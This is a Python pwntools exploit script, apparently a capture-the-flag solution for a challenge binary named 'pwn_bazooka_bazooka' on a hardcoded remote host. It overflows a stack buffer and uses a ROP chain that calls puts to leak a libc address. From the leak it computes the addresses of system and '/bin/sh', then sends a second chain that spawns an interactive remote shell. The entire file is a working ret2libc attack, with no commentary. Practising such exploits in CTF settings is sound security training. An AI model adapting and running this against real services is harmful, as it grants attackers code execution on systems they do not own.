from pwn import *

# context.aslr = False

# p = process("./pwn_bazooka_bazooka")

# elf = ELF("./pwn_bazooka_bazooka")

p = remote("35.246.235.150",31981)

puts_got = 0x601018
print("puts_got:",hex(puts_got))

puts_plt = 0x4005b0
print("puts_plt:",hex(puts_plt))

pop_rdi_ret = p64(0x00000000004008f3)
pop_rbp_ret = p64(0x0000000000400678)

loop_addr = 0x0040079c

p.recvuntil(b"message:")

first_message = b"#!@{try_hard3r}"

p.sendline(first_message)

p.recvuntil(b"Message: ")

overflow_buffer = b'a' * 120

payload = overflow_buffer + pop_rdi_ret + p64(puts_got) + p64(puts_plt) + p64(loop_addr)

p.sendline(payload)

a = p.recvline() # hacker alert message

leaked = p.recvline()
print("libc puts addr",repr(leaked))

leaked = leaked.strip()
if len(leaked) < 8:
    leaked = leaked.ljust(8, b"\x00")

puts_addr = u64(leaked)
print("puts_addr", hex(puts_addr))

system_offset = 0x4f550
str_bin_sh = 0x1b3e1a

p.sendline(first_message)

puts_offset = 0x80aa0

libc_base = puts_addr - puts_offset

print("libc base:",hex(libc_base))

bin_sh_addr = libc_base + str_bin_sh
print("bin_sh_addr:",hex(bin_sh_addr))

system_addr = libc_base + system_offset
print("system offset:",hex(system_addr))

simple_ret = 0x0000000000400596

payload = overflow_buffer + pop_rdi_ret + p64(bin_sh_addr) + p64(simple_ret) + p64(system_addr)

p.sendline(payload)

p.interactive()